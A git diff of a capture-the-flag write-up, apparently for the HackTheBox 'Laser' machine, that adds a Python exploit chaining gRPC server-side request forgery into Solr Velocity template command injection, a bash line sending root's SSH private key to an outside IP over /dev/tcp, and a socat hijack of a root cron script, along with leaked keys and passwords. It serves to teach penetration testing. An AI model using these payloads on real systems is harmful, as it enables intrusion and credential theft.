@@ -656,7 +656,7 @@ I got the above data points back from the capture.  They looked like decimal enc
 
 ![](../../.gitbook/assets/4-nvram-key-capture-decode.png)
 
-The key was decimal encoded, so I used CyberChef to decode it and got the key `13vu94r6643rv19u`. For some reason the console output didn't decode it properly. \(Im also not sure what the `46` characters are in the middle of the two halves, but they weren't needed. Some sort of delimiter for the two halves?\)
+The key was decimal encoded, so I used CyberChef to decode it and got the key `13vu94r6643rv19u`. For some reason the console output didn't decode it properly from the `nvram` command. \(I'm also not sure what the `46` characters are in the middle of the two halves, but they weren't needed. Some sort of delimiter for the two halves?\)
 
 ```text
 10.10.10.201:/> selftest
@@ -726,6 +726,7 @@ as input parameter and returns Data from the server.
 The Content message definition specifies a field data and Data message definition specifies a
 field feed .
 On successful data transmission you should see a message....
+
 return service_pb2.Data(feed='Pushing feeds')
 ...
 Here is how a sample feed information looks like.
@@ -766,7 +767,7 @@ Bugs
 4. Merge staging core to feed engine
 ```
 
-The PDF File contained instructions for interacting with a print API using gRPC on port 9000. It also contained the hostname `printer.laserinternal.htb` which I added to my `/etc/hosts` file
+The PDF File contained instructions for interacting with a print API using gRPC on port 9000. It also contained the hostname `printer.laserinternal.htb` which I added to my `/etc/hosts` file. 
 
 * [https://grpc.io/docs/languages/python/basics/](https://grpc.io/docs/languages/python/basics/)
 * [https://grpc.io/docs/what-is-grpc/introduction/](https://grpc.io/docs/what-is-grpc/introduction/)
@@ -785,11 +786,35 @@ service FooService {
 [https://developers.google.com/protocol-buffers/docs/pythontutorial](https://developers.google.com/protocol-buffers/docs/pythontutorial) [https://grpc.io/docs/languages/python/quickstart/](https://grpc.io/docs/languages/python/quickstart/)
 
 ```text
+syntax = "proto3";
+
+service Print {
+
+    rpc Feed(Content) returns (Data) {}
+
+}
+
+message Content {
+
+string data = 1;
+
+}
+
+message Data {
+
+string feed = 1;
+
+}
+```
+
+Using this information I created the above `.proto` file for telling the grpc protocol how to communicate with the service.
+
+```text
 ┌──(zweilos㉿kali)-[~/htb/laser]
 └─$python3 -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. laser.proto
 ```
 
-This created two files: `laser_pb2_grpc.py` and `laser_pb2.py`
+Next I ran the command from the documentation for making the python libraries that would enable communication with the server. This created two files: `laser_pb2_grpc.py` and `laser_pb2.py`.
 
 ```python
 import laser_pb2_grpc
@@ -798,7 +823,7 @@ import grpc
 import base64
 import pickle
 
-def run():
+def test():
     message = '{"feed_url":"http://10.10.15.98:8099"}'
     enc_message = base64.b64encode(pickle.dumps(message))
     channel = grpc.insecure_channel('printer.laserinternal.htb:9000')
@@ -806,10 +831,10 @@ def run():
     response = stub.Feed(laser_pb2.Content(data=enc_message))
     print("Client received: " + response.message)
 
-run()
+test()
 ```
 
-created a python client to connect to port 9000 on the server and send my request. Next I created a netcat listener to catch the return message
+I then created a python client `grpc_client.py` to connect to port 9000 on the server and send my request. Next I created a netcat listener to catch the return message.
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/laser]
@@ -822,21 +847,21 @@ User-Agent: FeedBot v1.0
 Accept: */*
 ```
 
-I got a connection back to my netcat listener, but I wasn't sure what to do with it at that point. Server Side Request Forgery
+I got a connection back to my netcat listener, but I wasn't sure what to do with it at that point. However, since I was able to entice the server to send me connections with information I controlled I figured I could try to do a Server Side Request Forgery \(SSRF\) attack.
 
 ```text
 On successful data transmission you should see a message....
 return service_pb2.Data(feed='Pushing feeds')
 ```
 
-The PDF mentioned that I should get back a message like the one above, but I did not get any messages back like that
+The PDF mentioned that I should get back the message `'Pushing feeds'`, but I did not get any messages back at all.  
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/laser]
 └─$ python3 grpc_client.py                                                                          1 ⨯
 Traceback (most recent call last):
   File "grpc_client.py", line 15, in <module>
-    run()
+    test()
   File "grpc_client.py", line 12, in run
     response = stub.Feed(laser_pb2.Content(data=enc_message))
   File "/home/zweilos/.local/lib/python3.8/site-packages/grpc/_channel.py", line 923, in __call__
@@ -850,15 +875,15 @@ grpc._channel._InactiveRpcError: <_InactiveRpcError of RPC that terminated with:
 >
 ```
 
-python gRPC client
+While doing some testing I forgot to start my listener, and got the above error message back since my computer refused the connection.
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/laser]
-└─$ python3 client.py
+└─$ python3 grpc_client.py
 Exception calling application: (6, 'Could not resolve host: printer.laserinternal.htb')
 ```
 
-got an error message with a new hostname
+After redirecting the target to be the internal machine I got an error message with a new hostname.  I added this to my `/etc/hosts` file.  Sending the traffic to this hostname did not resolve my connection errors.
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/laser]
@@ -872,23 +897,13 @@ PING printer.laserinternal.htb (10.10.10.201) 56(84) bytes of data.
 rtt min/avg/max/mdev = 40.902/41.234/41.566/0.332 ms
 ```
 
-I was able to ping the machine, so my connectivity wasn't the problem
+I was able to ping the machine, so my connectivity wasn't the problem.
 
 put in info about pinging back my machine
 
-Got a "Connection refused error", can use this to filter responses
+### Python port scanner - internal machine
 
-According to [https://developers.google.com/maps-booking/reference/grpc-api/status\_codes](https://developers.google.com/maps-booking/reference/grpc-api/status_codes), error code 2 for gRPC means:
-
-> 2 UNKNOWN For example, this error may be returned when a Status value received from another address space belongs to an error-space that isn't known in this address space. Also errors raised by APIs that don't return enough error information may be converted to this error.
-
-No matter what data I sent it, I would get the above error message. After doing some research, I found that the error code `status = StatusCode.UNKNOWN` means that the server is misconfigured. There was an issue raised for gRPC on GitHub, but it was closed because:
-
-> I found the issue is my GRPC server is enabled with default development certificate, and it requires SSL.
-
-[https://github.com/grpc/grpc/issues/22462](https://github.com/grpc/grpc/issues/22462)
-
-There may be an internal SSL port open that I cannot reach, therefore the errors. I need some way of enumerating the inside
+There may be an internal port open that I cannot reach, therefore the errors. I need some way of enumerating the inside.  Got a "Connection refused error", can use this to filter responses
 
 [https://www.kite.com/python/answers/how-to-get-the-value-of-an-exception-as-a-string-in-python](https://www.kite.com/python/answers/how-to-get-the-value-of-an-exception-as-a-string-in-python) [https://www.geeksforgeeks.org/port-scanner-using-python/](https://www.geeksforgeeks.org/port-scanner-using-python/)
 
@@ -935,7 +950,11 @@ def scan():
 scan()
 ```
 
-The scanner was very slow, as it made a full connection then sent its message and waited for a reply for every port. I thought about making the script multithreaded, but had to go out so I left it running instead
+I used the `grpc_client.py` as a base to build the port scanner.  The scanner was very slow as it made a full connection, sent its message, and waited for a reply for every port. I thought about making the script multithreaded, but had to go out so I left it running instead.  
+
+{% hint style="info" %}
+I did find a good example of how to do a multi-threaded port scanner at [https://github.com/gh0x0st/python3\_multithreading](https://github.com/gh0x0st/python3_multithreading).  This person's code is also very clean and well structured so thanks to them for that in addition to the great examples!
+{% endhint %}
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/laser]
@@ -956,9 +975,7 @@ Port 9100 open!
 Exception calling application: (1, 'Received HTTP/0.9 when not allowed\n')
 ```
 
-When I got back home I found two more ports open, and port `8983` responded with the message that was expected from the PDF.
-
-back up to scanner
+When I got back home I found two more ports open, and I noticed that port `8983` responded with the message of `feed: Pushing feeds` that was expected from the PDF.
 
 A search for port 8983 exploit led me to [https://www.exploit-db.com/exploits/47572](https://www.exploit-db.com/exploits/47572)
 
@@ -970,23 +987,64 @@ Solr is an open source application from Apache which provides searching and inde
 
 [https://github.com/jas502n/solr\_rce](https://github.com/jas502n/solr_rce)
 
-searched for how to interact with gRPC through command line and found [https://github.com/fullstorydev/grpcurl](https://github.com/fullstorydev/grpcurl)
+```python
+import laser_pb2
+import laser_pb2_grpc
+import grpc
+import base64
+import pickle
+import os
+import sys
+from func_timeout import func_set_timeout, FunctionTimedOut
+from urllib.parse import quote
 
-> grpcurl is a command-line tool that lets you interact with gRPC servers. It's basically curl for gRPC servers.
->
-> The main purpose for this tool is to invoke RPC methods on a gRPC server from the command-line. gRPC servers use a binary encoding on the wire \(protocol buffers, or "protobufs" for short\). So they are basically impossible to interact with using regular curl \(and older versions of curl that do not support HTTP/2 are of course non-starters\). This program accepts messages using JSON encoding, which is much more friendly for both humans and scripts.
+#this data set will configure the system to allow command execution
+data1 = "gopher://localhost:8983/_POST /solr/staging/config HTTP/1.1%0D%0AHost:127.0.0.1:8983%0D%0AContent-Type: application/json%0D%0AContent-Length:218%0D%0A%0D%0A{'update-queryresponsewriter': {'startup': 'lazy', 'name':'velocity', 'class': 'solr.VelocityResponseWriter', 'template.base.dir': '','solr.resource.loader.enabled': 'true', 'params.resource.loader.enabled':'true'}"
 
---Put python scripts here--
+#need to use 'quote' since the argument is a string inside quotes with spaces; otherwise will be parsed as separate arguments
+#this is the command injection I will use on the system to get a reverse shell
+cmd = quote(sys.argv[1])
+data2 = f"http://localhost:8983/solr/staging/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27{cmd}%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
+
+feed = '{ "version" : "v1.0", "title" : "PrinterFeed", "feed_url" : "replaceMe"}'
+
+#no creds, so need insecure channel
+channel = grpc.insecure_channel("10.10.10.201:9000")
+stub = laser_pb2_grpc.PrintStub(channel)
+
+#this @func_set_timeout(5) will make it so execution will continue after 5 seconds; This is needed since it hangs on this part otherwise
+@func_set_timeout(5)
+def configServer():
+  #need to replace the word "replaceMe" from the feed with the configuration string data1
+  feed = feed.replace("replaceMe", data1)
+  serialized = base64.b64encode(pickle.dumps(feed))
+  dataToPrint = stub.Feed(laser_pb2.Content(data = serialized))
+  print(dataToPrint.feed)
+
+def get_shell():
+  #need to replace the word "replaceMe" from the feed with the command injection string data2
+  feed = feed.replace("replaceMe", data2)
+  serialized = base64.b64encode(pickle.dumps(feed))
+  dataToPrint = stub.Feed(laser_pb2.Content(data = serialized))
+  print(dataToPrint.feed)
+
+try:
+    #Need to put this in try/except since it definitely causes an exception, which we will ignore and pass
+    configServer()
+except:
+    pass
+
+get_shell()
+```
+
+
 
 ## Initial Foothold
 
-## Road to User
-
-### Further enumeration
-
-### Finding user creds
+## 
 
 ```text
+python3 -c 'import pty;pty.spawn("/bin/bash")'
 solr@laser:~$ id && hostname
 uid=114(solr) gid=120(solr) groups=120(solr)
 laser
@@ -998,7 +1056,7 @@ got a shell on the machine from my waiting nc listener
 solr@laser:~$ echo 'ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNjkkEoBIEUE1qbriniZITFVwyL5zjbjJopB07xl9UAgAjbkTEx/IfL5xvd6cDNUHmW5KEkXTiNJm3sLBFfloVY=' >> .ssh/authorized_keys
 ```
 
-put my public key in the user's .ssh folder so I could log in
+Next, I put my public key in the `solr` user's `.ssh` folder so I could log in with a real shell.
 
 ```text
 solr@laser:/tmp/cypher/.ssh$ cat /etc/passwd
@@ -1056,7 +1114,7 @@ solr@laser:/home/solr$ cat user.txt
 1cc8750f9c5a710bc55718f7e7e2c762
 ```
 
-`user.txt` was in /home/solr as expected, however I was confused at first since this was not the user's home directory
+`user.txt` was in `/home/solr` as expected, however I was confused at first since this was not the user's home directory.
 
 ## Path to Power \(Gaining Administrator Access\)
 
@@ -1130,7 +1188,7 @@ solr@laser:/home/solr$ ip a
        valid_lft forever preferred_lft forever
 ```
 
-there semed to be a docker interface runnng on 172.17.0.1/16, and a container that looked to be hosted at 172.18.0.1
+there seemed to be a docker interface runnng on `172.17.0.1/16`, and a container that looked to be hosted in the `172.18.0.1/16` range.
 
 ```text
 solr@laser:~$ ps aux > /dev/shm/ps
@@ -1219,7 +1277,7 @@ sshpass -p zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz scp /opt/updates/files/jenkins-feed 
 
 the sshpass program is being used here to pass `root`'s password to secure copy in order to move some file `jenkins-feed` to a folder on the docker container
 
-> sshpass is a utility designed for running ssh using the mode referred to as "keyboard-interac‐ tive" password authentication, but in non-interactive mode.
+> sshpass is a utility designed for running ssh using the mode referred to as "keyboard-interactive" password authentication, but in non-interactive mode.
 >
 > ssh uses direct TTY access to make sure that the password is indeed issued by an interactive keyboard user. Sshpass runs ssh in a dedicated tty, fooling it into thinking it is getting the password from an interactive user.
 >
@@ -1368,7 +1426,7 @@ solr@laser:/dev/shm$ python3 get_pass.py
 'sshpass\x00-p\x00c413d115b3d87664499624e7826d8c5a\x00scp\x00/opt/updates/files/graphql-feed\x00root@172.18.0.2:/root/feeds/\x00'
 ```
 
-AFter waiting for quite some time, I got what I wanted. cleaning up the output makes the command:
+After waiting for quite some time, I got what I wanted. Cleaning up the output made the command:
 
 ```text
 sshpass -p c413d115b3d87664499624e7826d8c5a scp /opt/updates/files/bug-feed root@172.18.0.2:/root/feeds/
@@ -1435,7 +1493,7 @@ tmpfs            1017608       0   1017608   0% /proc/scsi
 tmpfs            1017608       0   1017608   0% /sys/firmware
 ```
 
-verfieid open space, and noticed it was just running memory space that was full \(`/dev/shm`\)
+verified open space, and noticed it was just running memory space that was full \(`/dev/shm`\)
 
 ```text
 solr@laser:~$ scp /usr/bin/docker root@172.18.0.2:/tmp/docker
@@ -1449,16 +1507,16 @@ so I copied the file to /tmp instead
 'sshpass\x00-p\x00zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz\x00ssh\x00root@172.18.0.2\x00/tmp/clear.sh\x00'
 ```
 
-I noticed another process being run by sshpass was executing a script `clear.sh` in the tmp directory
+I noticed another process being run by `sshpass` was executing a script `clear.sh` in the tmp directory
 
-[https://stackoverflow.com/questions/34791674/socat-port-forwarding-for-https](https://stackoverflow.com/questions/34791674/socat-port-forwarding-for-https)
+
 
 ```text
 solr@laser:/tmp$ vim /tmp/clear.sh
 solr@laser:/tmp$ chmod +x /tmp/clear.sh
 ```
 
-I made a script to copy roots ssh key to my machine so the cron job would run it
+I made a script to copy roots SSH key to my machine so the script would run it
 
 ```bash
 #! /bin/bash
@@ -1466,21 +1524,25 @@ I made a script to copy roots ssh key to my machine so the cron job would run it
 cat /root/.ssh/id_rsa > /dev/tcp/10.10.15.98/9099
 ```
 
-my bash script was very simple, and just copies `root`'s SSH to my machine using TCP sockets
+My bash script was very simple, and just copied `root`'s SSH to my machine using TCP sockets
+
+Since the process that was running the `clear.sh` script on the machine was owned by root, and since it was trying to run by connecting to port 22 on the container, I figured I needed a way to redirect that connection back to the local machine since there was no script named `clear.sh` there in the `/tmp` directory. This would give me the perfect opportunity to supply one for them for my own purposes.  After doing some research on how to redirect ports without using SSH, I found the easiest way was by using `socat`.  
+
+[https://stackoverflow.com/questions/34791674/socat-port-forwarding-for-https](https://stackoverflow.com/questions/34791674/socat-port-forwarding-for-https)
 
 ```text
 root@20e3289bc183:/tmp# ./socat -d TCP-LISTEN:22,fork,reuseaddr TCP:172.17.0.1:22
 2020/12/19 23:13:20 socat[1919] E bind(5, {AF=2 0.0.0.0:22}, 16): Address already in use
 ```
 
-Using `socat` I tried to redirect port 22 trafic from the container to the host so it would execute but the port was already in use \(by ssh\)
+Using `socat` I tried to redirect port 22 traffic from the container to the host so it would execute but the port was already in use \(by SSH\).
 
 ```text
 root@20e3289bc183:~# service ssh stop
  * Stopping OpenBSD Secure Shell server sshd                                                     [ OK ]
 ```
 
-next, I stopped the ssh service to clear the port
+Next, I stopped the SSH service to clear the port.
 
 ```text
 solr@laser:/dev/shm$ ssh root@172.18.0.2
@@ -1502,13 +1564,13 @@ Keyboard-interactive authentication is disabled to avoid man-in-the-middle attac
 root@172.18.0.2: Permission denied (publickey,password).
 ```
 
-for some reason I was unable to ssh in at one point while fixing up everything \(it took me a number of tries to get it to work properly!\) running the command it mentioned `ssh-keygen -f "/var/solr/.ssh/known_hosts" -R "172.18.0.2"` cleared the error and allowed me to log in again
+For some reason I was unable to SSH in at one point while fixing up everything \(it took me a number of tries to get it to work properly, as there was something causing the connection to the container to timeout after a short time!\).  Running the command it mentioned in the error message:`ssh-keygen -f "/var/solr/.ssh/known_hosts" -R "172.18.0.2"` cleared the error and allowed me to log in again.
 
 ```text
 root@20e3289bc183:~# ./socat -d TCP-LISTEN:22,fork,reuseaddr TCP:172.17.0.1:22
 ```
 
-After recreating the script I started the socat redirect again
+The process that would run my malicious `clear.sh` also deleted my file, so I had to keep putting it back in place.  After recreating the script I started the `socat` redirect again.
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/laser]
@@ -1556,7 +1618,7 @@ bgJuljQ7Wp+CYpVpDpxoHgHOZCCdD+WRRlacU/GKkex1gYuoL7iHFVQuBMD6jyjo
 -----END RSA PRIVATE KEY-----
 ```
 
-I received the SSH key back at my waiting listener almost immediately after starting the socat redirector
+I received the SSH key back at my waiting listener almost immediately after starting the `socat` redirect!
 
 ### Root.txt
 
@@ -1598,7 +1660,7 @@ uid=0(root) gid=0(root) groups=0(root)
 laser
 ```
 
-After that I logged in with the ssh key and collected my hard-earned proof!
+After that I logged in with the SSH key and collected my hard-earned proof!
 
 ```text
 root@laser:~# cat clear.sh 
